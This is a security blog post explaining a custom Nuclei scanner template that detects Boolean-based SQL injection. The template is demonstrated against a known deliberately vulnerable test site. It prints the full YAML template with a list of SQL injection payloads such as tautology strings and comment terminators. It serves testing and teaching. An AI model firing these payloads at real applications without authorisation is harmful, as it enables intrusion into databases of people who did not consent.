---
title: Next Generation Nuclei: Detecting SQLi with Logic
url: https://infosecwriteups.com/next-generation-nuclei-detecting-sqli-with-logic-05549c34885b?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-06-06
fetch_date: 2025-10-06T16:55:59.282672
---

# Next Generation Nuclei: Detecting SQLi with Logic

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F05549c34885b&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fnext-generation-nuclei-detecting-sqli-with-logic-05549c34885b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fnext-generation-nuclei-detecting-sqli-with-logic-05549c34885b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-05549c34885b---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-05549c34885b---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Next Generation Nuclei: Detecting SQLi with Logic

[![Serhat ÇİÇEK](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/%40serhatcck?source=post_page---byline--05549c34885b---------------------------------------)

[Serhat ÇİÇEK](https://medium.com/%40serhatcck?source=post_page---byline--05549c34885b---------------------------------------)

4 min read

·

May 21, 2024

--

Listen

Share

Press enter or click to view image in full size

![]()

SQL Injection (SQLi) is a common and critical security vulnerability in web applications. In this article, I will introduce our new Nuclei plugin designed to detect Boolean-based SQLi. We will explain in detail how the plugin works and how to use it.

### What is Nuclei?

Nuclei is an open-source security scanning tool. It uses customizable templates to detect various security vulnerabilities. These templates identify vulnerabilities by sending HTTP requests and analyzing the responses.

### What is Boolean Based SQL Injection?

Boolean-based SQLi is a technique used to gather information about the structure of a database by manipulating SQL queries to return true or false responses. This technique involves using logical expressions in SQL queries to manipulate the responses.

### Fuzzing With Nuclei

With the release of Nuclei version 3.2, fuzzing support has been announced. With this feature, we can now perform fuzzing in Nuclei just like with other fuzzing tools. You can access the related article through the [link](https://blog.projectdiscovery.io/nuclei-fuzzing-for-unknown-vulnerabilities/).

### POC

We will use the link “<http://testphp.vulnweb.com/artists.php?artist=2>" as our target. This link contains an SQLi vulnerability. This SQLi can be exploited in several different ways, but in this article, we will focus on the Boolean Based type.

The related Nuclei template is as follows. We will analyze step-by-step how the template works:

```
id: sqli-boolean-based-get

info:
  name: Boolean Based SQL Injection
  author: serhatcck
  severity: critical
  description: Boolean Based SQLi
  tags: sqli, dast

flow: http(1) && http(2)

http:
  - method: GET
    path:
     - "{BaseURL}"

    payloads:
      empty:
        - ''

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{empty}}"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
        internal: true

  - method: GET
    path:
     - "{BaseURL}"

    payloads:
      injection:
        - "' or '123'='123"
        - " or 123 = 123"
        - "' and '123'='123"
        - "\" or \"123\"=\"123\""
        - "\" and \"123\"=\"123\""
        - " or 1=1 -- -"
        - " or 1=1; -- -"
        - "and 1=1; -- -"

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl :
           - '(len(http_2_body) + len(injection)) > len(http_1_body) '
```

The template first sends a request to the target with an empty payload list:

```
- method: GET
    path:
     - "{BaseURL}"

    payloads:
      empty:
        - ''

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{empty}}"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
        internal: true
```

Here, the important part to note is the matcher section. DSL is used in this section, and it checks the `status_code`. Additionally, it is set with `internal: true`. As a result of this setting, the outcome of the first request is not considered a vulnerability, and the process moves on to the next step.

In the second step, the payloads necessary for fuzzing are defined and the required fuzzing rules are written:

```
- method: GET
    path:
     - "{BaseURL}"

    payloads:
      injection:
        - "' or '123'='123"
        - " or 123 = 123"
        - "' and '123'='123"
        - "\" or \"123\"=\"123\""
        - "\" and \"123\"=\"123\""
        - " or 1=1 -- -"
        - " or 1=1; -- -"
        - "and 1=1; -- -"

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl :
           - '(len(http_2_body) + len(injection)) > len(http_1_body) '
```

In this step, the matcher is different. This matcher compares the size of the first HTTP response with the size of the second HTTP response. The reason for this is that if a vulnerability is found using the `OR` clause, it will likely return all the article information in the system.

Fuzzing operations in Nuclei should utilize the `-dast` tag available.

Press enter or click to view image in full size

![]()

> **The POC performed in this article does not fully simulate a Boolean-based scenario.** **The main purpose here is to demonstrate how to perform logical operations using Nuclei templates.**

### Summary

With the addition of the fuzzing feature, Nuclei has become more versatile. As demonstrated in the above POC, multiple HTTP requests can be linked using “flow” and their results compared. This feature introduces a new perspective to automated DAST (Dynamic Application Security Testing) checks. Custom templates can be created for specific scenarios, allowing testers to develop their own automated DAST tools. Many thanks to the Project Discovery team for providing this technology.

### References

[## Fuzzing for Unknown Vulnerabilities with Nuclei v3.2

### At ProjectDiscovery, our goal is to democratize security. Nuclei, our flagship project, plays a pivotal role in…

blog.projectdiscovery.io](https://blog.projectdiscovery.io/nuclei-fuzzing-for-unknown-vulnerabilities/?source=post_page-----05549c34885b---------------------------------------)

[## Basic HTTP Protocol - ProjectDiscovery Documentati...